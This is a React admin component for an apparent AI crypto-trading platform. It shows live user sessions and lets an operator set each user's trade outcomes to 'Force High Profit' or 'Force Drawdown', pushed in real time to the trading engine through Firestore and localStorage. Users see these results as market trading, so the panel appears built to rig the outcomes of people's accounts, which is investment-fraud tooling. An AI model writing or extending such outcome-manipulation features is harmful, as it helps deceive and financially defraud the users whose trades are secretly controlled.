import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  X, Shield, TrendingUp, TrendingDown, DollarSign, 
  Clock, Activity, CheckCircle2, RefreshCw, 
  ArrowUpRight, ArrowDownRight, Square, Sliders, 
  Copy, Check, Cpu, Sparkles
} from 'lucide-react';
import { doc, updateDoc, setDoc, onSnapshot, collection } from 'firebase/firestore';
import { db } from '../../../lib/firebase';
import { SessionAdminControl, SessionControlMode } from '../../../types/aiTrading';

export interface ActiveSessionRecord {
  id: string;
  userId: string;
  userEmail: string;
  status: 'ACTIVE' | 'INACTIVE';
  startTime: any;
  tradingCapital: number;
  initialCapital: number;
  openPositionsCount: number;
  totalProfit: number;
  totalLoss: number;
  activeConfigId?: string;
  strategyName?: string;
  adminControl?: SessionAdminControl;
}

export interface TradeRecord {
  id: string;
  userId?: string;
  userEmail?: string;
  symbol: string;
  type: 'buy' | 'sell' | 'long' | 'short';
  amount: number;
  entryPrice: number;
  currentPrice?: number;
  leverage?: number;
  pnl?: number;
  status: 'OPEN' | 'CLOSED';
  timestamp: string;
  sessionId?: string;
}

interface AdminSessionControlModalProps {
  session: ActiveSessionRecord;
  allActiveSessions?: ActiveSessionRecord[];
  theme: 'light' | 'dark';
  onClose: () => void;
  onSelectSession?: (session: ActiveSessionRecord) => void;
  onSessionTerminated?: (sessionId: string) => void;
}

export default function AdminSessionControlModal({
  session: initialSession,
  allActiveSessions = [],
  theme,
  onClose,
  onSelectSession,
  onSessionTerminated
}: AdminSessionControlModalProps) {
  const [session, setSession] = useState<ActiveSessionRecord>(initialSession);
  const [sessionTrades, setSessionTrades] = useState<TradeRecord[]>([]);
  const [copiedUid, setCopiedUid] = useState(false);
  const [isSaving, setIsSaving] = useState(false);
  const [saveSuccessMsg, setSaveSuccessMsg] = useState<string | null>(null);

  // Sync state if initialSession prop changes
  useEffect(() => {
    setSession(initialSession);
    setMode(initialSession.adminControl?.mode || 'NORMAL');
  }, [initialSession]);

  // Outcome control state
  const currentControl: SessionAdminControl = session.adminControl || {
    mode: 'NORMAL',
    forceNextTrade: 'AUTO'
  };

  const [mode, setMode] = useState<SessionControlMode>(currentControl.mode || 'NORMAL');

  // Live session timer calculation
  const [elapsedFormatted, setElapsedFormatted] = useState('00:00:00');

  // Escape key to close modal
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape') onClose();
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [onClose]);

  // Elapsed timer ticker
  useEffect(() => {
    const getStartTimeMs = (ts: any): number => {
      if (!ts) return Date.now();
      if (typeof ts === 'object' && ts !== null) {
        if (typeof ts.toDate === 'function') return ts.toDate().getTime();
        if (typeof ts.seconds === 'number') return ts.seconds * 1000;
      }
      const d = new Date(ts).getTime();
      return isNaN(d) ? Date.now() : d;
    };

    const startMs = getStartTimeMs(session.startTime);

    const updateTimer = () => {
      const diff = Math.max(0, Date.now() - startMs);
      const hrs = Math.floor(diff / 3600000);
      const mins = Math.floor((diff % 3600000) / 60000);
      const secs = Math.floor((diff % 60000) / 1000);
      const pad = (n: number) => n.toString().padStart(2, '0');
      setElapsedFormatted(`${pad(hrs)}:${pad(mins)}:${pad(secs)}`);
    };

    updateTimer();
    const interval = setInterval(updateTimer, 1000);
    return () => clearInterval(interval);
  }, [session.startTime]);

  // Real-time Firestore sync for Session and its Trades
  useEffect(() => {
    // 1. Session Document Listener
    const unsubSession = onSnapshot(doc(db, 'aiSessions', session.id), (snap) => {
      if (snap.exists()) {
        const data = snap.data();
        setSession(prev => ({
          ...prev,
          ...data,
          id: snap.id,
          startTime: data.startTime || prev.startTime,
          adminControl: data.adminControl || prev.adminControl
        }));

        if (data.adminControl) {
          setMode(data.adminControl.mode || 'NORMAL');
        }
      }
    }, (err) => {
      console.warn("Realtime session sync fallback:", err);
    });

    // 2. User Trades Listener
    const unsubTrades = onSnapshot(collection(db, 'users', session.userId, 'trades'), (snap) => {
      const list: TradeRecord[] = [];
      snap.forEach(tDoc => {
        const d = tDoc.data();
        list.push({
          id: tDoc.id,
          userId: session.userId,
          userEmail: session.userEmail,
          symbol: d.symbol || d.asset || 'BTC/USDT',
          type: d.type || 'long',
          amount: d.amount || d.size || d.quantity || 0,
          entryPrice: d.entryPrice || d.entry || 0,
          currentPrice: d.currentPrice || d.entryPrice || 0,
          leverage: d.leverage || 1,
          pnl: d.pnl || 0,
          status: d.status || 'OPEN',
          timestamp: d.timestamp || d.openedAt || new Date().toISOString(),
          sessionId: d.sessionId
        });
      });

      // Also read local trades if available
      try {
        const localRaw = localStorage.getItem(`aver_trades_${session.userId}`);
        if (localRaw) {
          const parsed = JSON.parse(localRaw);
          if (Array.isArray(parsed)) {
            parsed.forEach((pt: any) => {
              if (!list.some(x => x.id === pt.id)) {
                list.push({
                  id: pt.id || `loc_${Date.now()}`,
                  userId: session.userId,
                  userEmail: session.userEmail,
                  symbol: pt.symbol || pt.asset || 'BTC/USDT',
                  type: pt.type || 'long',
                  amount: pt.amount || pt.size || pt.quantity || 0,
                  entryPrice: pt.entryPrice || pt.entry || 0,
                  currentPrice: pt.currentPrice || pt.entryPrice || 0,
                  leverage: pt.leverage || 1,
                  pnl: pt.pnl || 0,
                  status: pt.status || 'OPEN',
                  timestamp: pt.timestamp || pt.openedAt || new Date().toISOString(),
                  sessionId: pt.sessionId
                });
              }
            });
          }
        }
      } catch (e) {}

      // Sort newest first
      list.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
      setSessionTrades(list);
    }, (err) => {
      console.warn("Trades sync fallback to localStorage:", err);
      try {
        const localRaw = localStorage.getItem(`aver_trades_${session.userId}`);
        if (localRaw) {
          const parsed = JSON.parse(localRaw);
          if (Array.isArray(parsed)) {
            setSessionTrades(parsed);
          }
        }
      } catch (e) {}
    });

    const handleLocalSync = () => {
      try {
        // Read local session
        const raw = localStorage.getItem(`aver_session_${session.userId}`);
        if (raw) {
          const data = JSON.parse(raw);
          if (data && data.id === session.id) {
            setSession(prev => ({ ...prev, ...data }));
            if (data.adminControl?.mode) setMode(data.adminControl.mode);
          }
        }
        // Read registry
        const regRaw = localStorage.getItem('aver_active_sessions_registry');
        if (regRaw) {
          const reg = JSON.parse(regRaw);
          if (reg[session.id]) {
            setSession(prev => ({ ...prev, ...reg[session.id] }));
            if (reg[session.id].adminControl?.mode) setMode(reg[session.id].adminControl.mode);
          }
        }
      } catch (e) {}
    };

    const handleSessionTerminated = (e: Event) => {
      const customEvent = e as CustomEvent;
      if (customEvent.detail?.sessionId === session.id) {
        if (onSessionTerminated) onSessionTerminated(session.id);
        onClose();
      }
    };

    window.addEventListener('storage', handleLocalSync);
    window.addEventListener('aver_session_updated', handleLocalSync);
    window.addEventListener('aver_sessions_registry_updated', handleLocalSync);
    window.addEventListener('aver_session_terminated', handleSessionTerminated);

    return () => {
      unsubSession();
      unsubTrades();
      window.removeEventListener('storage', handleLocalSync);
      window.removeEventListener('aver_session_updated', handleLocalSync);
      window.removeEventListener('aver_sessions_registry_updated', handleLocalSync);
      window.removeEventListener('aver_session_terminated', handleSessionTerminated);
    };
  }, [session.id, session.userId, session.userEmail, onClose, onSessionTerminated]);

  // Apply and Save Admin Outcome Control
  const handleSaveControl = async (newMode: SessionControlMode) => {
    setIsSaving(true);
    setSaveSuccessMsg(null);

    const updatedControl: SessionAdminControl = {
      mode: newMode,
      forceNextTrade: 'AUTO',
      updatedAt: new Date().toISOString()
    };

    try {
      // 1. Update Firestore session doc
      await updateDoc(doc(db, 'aiSessions', session.id), {
        adminControl: updatedControl
      }).catch(async () => {
        await setDoc(doc(db, 'aiSessions', session.id), {
          adminControl: updatedControl
        }, { merge: true });
      });

      // 2. Update localStorage for instant zero-latency sync across tabs & local engine
      const controlKey = `aver_session_control_${session.id}`;
      const userControlKey = `aver_session_control_${session.userId}`;
      localStorage.setItem(controlKey, JSON.stringify(updatedControl));
      localStorage.setItem(userControlKey, JSON.stringify(updatedControl));

      // 3. Update session object in local storage if exists
      try {
        const sessStr = localStorage.getItem(`aver_session_${session.userId}`);
        if (sessStr) {
          const sObj = JSON.parse(sessStr);
          sObj.adminControl = updatedControl;
          localStorage.setItem(`aver_session_${session.userId}`, JSON.stringify(sObj));
        }
      } catch (e) {}

      // 4. Dispatch global event so TradingEngineContext picks it up immediately
      window.dispatchEvent(new CustomEvent('aver_admin_control_updated', {
        detail: {
          sessionId: session.id,
          userId: session.userId,
          adminControl: updatedControl,
          control: updatedControl
        }
      }));
      window.dispatchEvent(new Event('storage'));

      // Update local state
      setSession(prev => ({
        ...prev,
        adminControl: updatedControl
      }));

      const modeLabel = newMode === 'NORMAL' ? 'Natural / Normal' : newMode === 'FORCE_PROFIT' ? 'Force High Profit' : 'Force Drawdown';
      setSaveSuccessMsg(`${modeLabel} activated!`);
      setTimeout(() => setSaveSuccessMsg(null), 3000);
    } catch (err) {
      console.error("Error applying outcome control:", err);
      // Fallback local update
      localStorage.setItem(`aver_session_control_${session.id}`, JSON.stringify(updatedControl));
      localStorage.setItem(`aver_session_control_${session.userId}`, JSON.stringify(updatedControl));
      window.dispatchEvent(new CustomEvent('aver_admin_control_updated', {
        detail: {
          sessionId: session.id,
          userId: session.userId,
          adminControl: updatedControl,
          control: updatedControl
        }
      }));
      window.dispatchEvent(new Event('storage'));
      setSaveSuccessMsg('Outcome directive applied (local sync active)!');
      setTimeout(() => setSaveSuccessMsg(null), 3000);
    } finally {
      setIsSaving(false);
    }
  };

  // Switch Mode Instantly
  const handleSelectMode = async (selectedMode: SessionControlMode) => {
    setMode(selectedMode);
    await handleSaveControl(selectedMode);
  };

  const openTrades = sessionTrades.filter(t => t.status === 'OPEN');
  const closedTrades = sessionTrades.filter(t => t.status === 'CLOSED');
  const totalNetPnl = (session.totalProfit || 0) - (session.totalLoss || 0);
  const isNetPnlPositive = totalNetPnl >= 0;
  const initialCap = session.initialCapital || session.tradingCapital || 1000;
  const pnlPercent = initialCap > 0 ? (totalNetPnl / initialCap) * 100 : 0;

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-slate-950/95 backdrop-blur-2xl text-white flex flex-col notranslate" translate="no">
      {/* Top Fixed Header */}
      <div className="sticky top-0 z-40 bg-slate-900/90 backdrop-blur-md border-b border-white/10 px-4 md:px-8 py-3.5 flex items-center justify-between gap-4">
        {/* Left: User Identity & Live Badge */}
        <div className="flex items-center gap-3 min-w-0">
          <div className="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center flex-shrink-0">
            <Cpu className="w-5 h-5 text-emerald-400" />
          </div>
          <div className="min-w-0">
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
              <span className="text-[10px] font-black tracking-widest text-emerald-400 uppercase bg-emerald-500/10 px-2 py-0.5 rounded-md border border-emerald-500/20">
                LIVE SESSION OUTCOME CONTROL
              </span>
              <span className="text-xs text-slate-400 font-mono flex items-center gap-1">
                <Clock className="w-3.5 h-3.5 text-slate-500" />
                {elapsedFormatted}
              </span>
            </div>
            <div className="flex items-center gap-2 mt-0.5">
              <h2 className="text-base md:text-lg font-black text-white truncate">{session.userEmail}</h2>
              <button
                onClick={() => {
                  navigator.clipboard.writeText(session.userId);
                  setCopiedUid(true);
                  setTimeout(() => setCopiedUid(false), 2000);
                }}
                className="text-[11px] text-slate-400 hover:text-white bg-white/5 hover:bg-white/10 px-2 py-0.5 rounded flex items-center gap-1 font-mono transition-colors"
                title="Copy User UID"
              >
                {copiedUid ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                UID: {session.userId.slice(0, 8)}...
              </button>
            </div>
          </div>
        </div>

        {/* Right: Status & Close */}
        <div className="flex items-center gap-3">
          {saveSuccessMsg && (
            <motion.div 
              initial={{ opacity: 0, y: -10 }}
              animate={{ opacity: 1, y: 0 }}
              className="flex items-center gap-1.5 text-xs font-bold text-emerald-400 bg-emerald-500/10 border border-emerald-500/30 px-3 py-1.5 rounded-xl"
            >
              <CheckCircle2 className="w-4 h-4" />
              {saveSuccessMsg}
            </motion.div>
          )}

          <button
            onClick={onClose}
            className="w-9 h-9 rounded-xl bg-white/10 hover:bg-white/20 border border-white/10 flex items-center justify-center text-slate-300 hover:text-white transition-all"
            title="Close Fullscreen View (Esc)"
          >
            <X className="w-5 h-5" />
          </button>
        </div>
      </div>

      {/* Dynamic Session Tabs (All Active Sessions) */}
      {allActiveSessions && allActiveSessions.length > 0 && (
        <div className="bg-slate-900/60 border-b border-white/10 px-4 md:px-8 py-2 flex items-center gap-2 overflow-x-auto scrollbar-thin">
          <span className="text-xs font-bold text-slate-400 uppercase tracking-wider whitespace-nowrap mr-1">
            Active Sessions ({allActiveSessions.length}):
          </span>
          {allActiveSessions.map((s) => {
            const isCurrent = s.id === session.id;
            const sMode = s.adminControl?.mode || 'NORMAL';
            const tabName = s.userEmail?.split('@')[0] || s.userEmail || s.userId;
            return (
              <button
                key={s.id}
                onClick={() => {
                  if (onSelectSession) onSelectSession(s);
                  setSession(s);
                  setMode(s.adminControl?.mode || 'NORMAL');
                }}
                className={`flex items-center gap-2 px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all whitespace-nowrap border ${
                  isCurrent
                    ? 'bg-emerald-500 text-slate-950 border-emerald-400 shadow-md shadow-emerald-500/20 ring-1 ring-emerald-400'
                    : 'bg-white/5 text-slate-300 border-white/10 hover:bg-white/10 hover:text-white'
                }`}
              >
                <span className={`w-1.5 h-1.5 rounded-full ${sMode === 'FORCE_PROFIT' ? 'bg-emerald-400' : sMode === 'FORCE_LOSS' ? 'bg-rose-400' : 'bg-slate-400'}`}></span>
                <span>{tabName}</span>
                <span className={`text-[9px] px-1 py-0.5 rounded font-mono ${isCurrent ? 'bg-slate-950/20 text-slate-950' : 'bg-white/10 text-slate-400'}`}>
                  {sMode === 'FORCE_PROFIT' ? 'PROFIT' : sMode === 'FORCE_LOSS' ? 'DRAWDOWN' : 'NORMAL'}
                </span>
              </button>
            );
          })}
        </div>
      )}

      {/* Main Content Body */}
      <div className="flex-1 p-4 md:p-8 max-w-5xl mx-auto w-full space-y-6">
        {/* KPI Row */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 md:gap-4">
          {/* Allocated Capital */}
          <div className="p-4 md:p-5 rounded-2xl bg-slate-900/80 border border-white/10 relative overflow-hidden">
            <div className="flex items-center justify-between text-slate-400 text-xs font-bold uppercase tracking-wider mb-1">
              <span>Allocated Capital</span>
              <DollarSign className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-xl md:text-2xl font-black font-mono text-white">
              ${(session.tradingCapital || 0).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
            </div>
            <div className="text-[11px] text-slate-500 mt-1 flex items-center justify-between">
              <span>Initial: ${initialCap.toLocaleString()}</span>
              <span className="font-mono text-emerald-400">#{(session.id || '').slice(-6)}</span>
            </div>
          </div>

          {/* Session P&L */}
          <div className="p-4 md:p-5 rounded-2xl bg-slate-900/80 border border-white/10 relative overflow-hidden">
            <div className="flex items-center justify-between text-slate-400 text-xs font-bold uppercase tracking-wider mb-1">
              <span>Live Session P&L</span>
              {isNetPnlPositive ? <TrendingUp className="w-4 h-4 text-emerald-400" /> : <TrendingDown className="w-4 h-4 text-rose-400" />}
            </div>
            <div className={`text-xl md:text-2xl font-black font-mono flex items-center gap-1 ${isNetPnlPositive ? 'text-emerald-400' : 'text-rose-400'}`}>
              {isNetPnlPositive ? '+' : ''}${totalNetPnl.toFixed(2)}
              <span className="text-xs font-bold px-1.5 py-0.5 rounded bg-white/5 border border-white/10 ml-1">
                {isNetPnlPositive ? '+' : ''}{pnlPercent.toFixed(2)}%
              </span>
            </div>
            <div className="text-[11px] text-slate-500 mt-1 flex items-center justify-between">
              <span>Profits: +${(session.totalProfit || 0).toFixed(2)}</span>
              <span>Losses: -${(session.totalLoss || 0).toFixed(2)}</span>
            </div>
          </div>

          {/* Active Positions */}
          <div className="p-4 md:p-5 rounded-2xl bg-slate-900/80 border border-white/10 relative overflow-hidden">
            <div className="flex items-center justify-between text-slate-400 text-xs font-bold uppercase tracking-wider mb-1">
              <span>Open Positions</span>
              <Activity className="w-4 h-4 text-blue-400" />
            </div>
            <div className="text-xl md:text-2xl font-black font-mono text-blue-400">
              {openTrades.length} <span className="text-sm font-normal text-slate-400">active</span>
            </div>
            <div className="text-[11px] text-slate-500 mt-1 flex items-center justify-between">
              <span>Closed Trades: {closedTrades.length}</span>
              <span className="text-emerald-400 font-bold">Scanning Live</span>
            </div>
          </div>

          {/* Active Outcome Mode */}
          <div className="p-4 md:p-5 rounded-2xl bg-slate-900/80 border border-emerald-500/30 relative overflow-hidden shadow-lg shadow-emerald-950/20">
            <div className="flex items-center justify-between text-slate-400 text-xs font-bold uppercase tracking-wider mb-1">
              <span>Active Outcome Mode</span>
              <Sparkles className="w-4 h-4 text-amber-400" />
            </div>
            <div className="text-base md:text-lg font-black text-amber-400 flex items-center gap-1.5 truncate">
              {mode === 'NORMAL' && <span className="text-slate-200">🟢 Natural / Normal</span>}
              {mode === 'FORCE_PROFIT' && <span className="text-emerald-400">🚀 Force High Profit</span>}
              {mode === 'FORCE_LOSS' && <span className="text-rose-400">🔻 Force Drawdown</span>}
            </div>
            <div className="text-[11px] text-slate-400 mt-1 flex items-center justify-between">
              <span>Direct Session Control</span>
              <span className="text-[10px] text-emerald-400 font-bold uppercase">Active</span>
            </div>
          </div>
        </div>

        {/* OUTCOME CONTROL SECTION (ONLY 3 STRICT OPTIONS) */}
        <div className="space-y-4 pt-2">
          <div className="flex items-center justify-between">
            <div>
              <h3 className="text-base font-bold text-white flex items-center gap-2">
                <Sliders className="w-5 h-5 text-emerald-400" />
                Select Trade Outcome Directive
              </h3>
              <p className="text-xs text-slate-400 mt-0.5">
                Choose how upcoming trades execute for {session.userEmail}. Changes apply in real time.
              </p>
            </div>

            {isSaving && (
              <div className="flex items-center gap-2 text-xs text-emerald-400 font-medium">
                <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                Syncing...
              </div>
            )}
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {/* 1. NATURAL / NORMAL */}
            <div
              id="outcome-mode-normal"
              onClick={() => handleSelectMode('NORMAL')}
              className={`p-6 rounded-2xl border cursor-pointer transition-all flex flex-col justify-between group ${
                mode === 'NORMAL'
                  ? 'bg-slate-900 border-emerald-400 shadow-xl shadow-emerald-500/10 ring-2 ring-emerald-400'
                  : 'bg-slate-900/60 border-white/10 hover:border-white/30 hover:bg-slate-900'
              }`}
            >
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${
                    mode === 'NORMAL' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-slate-800 text-slate-400'
                  }`}>
                    <Shield className="w-5 h-5" />
                  </div>
                  {mode === 'NORMAL' ? (
                    <span className="text-xs font-black uppercase text-emerald-400 bg-emerald-500/20 px-2.5 py-1 rounded-md border border-emerald-500/30 flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                      ACTIVE
                    </span>
                  ) : (
                    <span className="text-[11px] font-bold text-slate-500 group-hover:text-slate-300">
                      Tap to select
                    </span>
                  )}
                </div>

                <div>
                  <h4 className="font-black text-base text-white">Natural / Normal</h4>
                  <p className="text-xs text-slate-400 leading-relaxed mt-2">
                    Zero manipulation. Trades 100% naturally using real market price feeds and normal algorithm risk rules.
                  </p>
                </div>
              </div>

              <div className="pt-4 mt-4 border-t border-white/5 flex items-center justify-between text-xs text-slate-400">
                <span>Algorithmic Execution</span>
                <span className="font-mono text-[11px]">Real Market</span>
              </div>
            </div>

            {/* 2. FORCE HIGH PROFIT */}
            <div
              id="outcome-mode-force-profit"
              onClick={() => handleSelectMode('FORCE_PROFIT')}
              className={`p-6 rounded-2xl border cursor-pointer transition-all flex flex-col justify-between group ${
                mode === 'FORCE_PROFIT'
                  ? 'bg-slate-900 border-emerald-400 shadow-xl shadow-emerald-500/20 ring-2 ring-emerald-400'
                  : 'bg-slate-900/60 border-white/10 hover:border-emerald-500/30 hover:bg-slate-900'
              }`}
            >
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${
                    mode === 'FORCE_PROFIT' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-emerald-500/10 text-emerald-500/70'
                  }`}>
                    <TrendingUp className="w-5 h-5" />
                  </div>
                  {mode === 'FORCE_PROFIT' ? (
                    <span className="text-xs font-black uppercase text-emerald-400 bg-emerald-500/20 px-2.5 py-1 rounded-md border border-emerald-500/30 flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                      ACTIVE
                    </span>
                  ) : (
                    <span className="text-[11px] font-bold text-slate-500 group-hover:text-emerald-400">
                      Tap to select
                    </span>
                  )}
                </div>

                <div>
                  <h4 className="font-black text-base text-emerald-400">Force High Profit</h4>
                  <p className="text-xs text-slate-400 leading-relaxed mt-2">
                    Forces upcoming trades to execute in strong positive profit with maximized alpha returns.
                  </p>
                </div>
              </div>

              <div className="pt-4 mt-4 border-t border-white/5 flex items-center justify-between text-xs text-emerald-400/80">
                <span>Profit Yield Injection</span>
                <span className="font-mono text-[11px] font-bold">+Alpha Boost</span>
              </div>
            </div>

            {/* 3. FORCE DRAWDOWN */}
            <div
              id="outcome-mode-force-drawdown"
              onClick={() => handleSelectMode('FORCE_LOSS')}
              className={`p-6 rounded-2xl border cursor-pointer transition-all flex flex-col justify-between group ${
                mode === 'FORCE_LOSS'
                  ? 'bg-slate-900 border-rose-400 shadow-xl shadow-rose-500/20 ring-2 ring-rose-400'
                  : 'bg-slate-900/60 border-white/10 hover:border-rose-500/30 hover:bg-slate-900'
              }`}
            >
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div className={`w-10 h-10 rounded-xl flex items-center justify-center ${
                    mode === 'FORCE_LOSS' ? 'bg-rose-500/20 text-rose-400' : 'bg-rose-500/10 text-rose-500/70'
                  }`}>
                    <TrendingDown className="w-5 h-5" />
                  </div>
                  {mode === 'FORCE_LOSS' ? (
                    <span className="text-xs font-black uppercase text-rose-400 bg-rose-500/20 px-2.5 py-1 rounded-md border border-rose-500/30 flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-rose-400 animate-pulse"></span>
                      ACTIVE
                    </span>
                  ) : (
                    <span className="text-[11px] font-bold text-slate-500 group-hover:text-rose-400">
                      Tap to select
                    </span>
                  )}
                </div>

                <div>
                  <h4 className="font-black text-base text-rose-400">Force Drawdown</h4>
                  <p className="text-xs text-slate-400 leading-relaxed mt-2">
                    Simulates controlled negative yield and drawdown on subsequent trade executions.
                  </p>
                </div>
              </div>

              <div className="pt-4 mt-4 border-t border-white/5 flex items-center justify-between text-xs text-rose-400/80">
                <span>Drawdown Simulation</span>
                <span className="font-mono text-[11px] font-bold">Negative Yield</span>
              </div>
            </div>
          </div>
        </div>

        {/* Real-time Open Orders Overview */}
        <div className="space-y-3 pt-4 border-t border-white/10">
          <div className="flex items-center justify-between">
            <h4 className="text-sm font-bold text-white flex items-center gap-2">
              <Activity className="w-4 h-4 text-emerald-400" />
              Live Active Positions ({openTrades.length})
            </h4>
            <span className="text-xs text-slate-400">
              Orders automatically execute according to the selected directive
            </span>
          </div>

          {openTrades.length === 0 ? (
            <div className="p-6 rounded-2xl bg-slate-900/40 border border-white/5 text-center text-xs text-slate-500">
              Scanning live market liquidity... Upcoming positions will trigger under <b className="text-slate-300">{mode === 'NORMAL' ? 'Natural / Normal' : mode === 'FORCE_PROFIT' ? 'Force High Profit' : 'Force Drawdown'}</b>.
            </div>
          ) : (
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3">
              {openTrades.map(trade => {
                const isLong = trade.type === 'buy' || trade.type === 'long';
                const pnl = trade.pnl || 0;
                const isWin = pnl >= 0;
                return (
                  <div key={trade.id} className="p-4 rounded-xl bg-slate-900/80 border border-white/10 space-y-2">
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <span className={`text-[10px] font-black px-1.5 py-0.5 rounded ${isLong ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'}`}>
                          {isLong ? 'LONG' : 'SHORT'}
                        </span>
                        <span className="font-bold text-xs text-white">{trade.symbol}</span>
                      </div>
                      <span className="text-xs font-mono font-bold text-slate-300">
                        ${Number(trade.amount || 0).toFixed(2)}
                      </span>
                    </div>
                    <div className="flex items-center justify-between text-[11px] text-slate-400 font-mono">
                      <span>Entry: ${Number(trade.entryPrice || 0).toLocaleString()}</span>
                      <span className={isWin ? 'text-emerald-400 font-bold' : 'text-rose-400 font-bold'}>
                        {isWin ? '+' : ''}${pnl.toFixed(2)}
                      </span>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
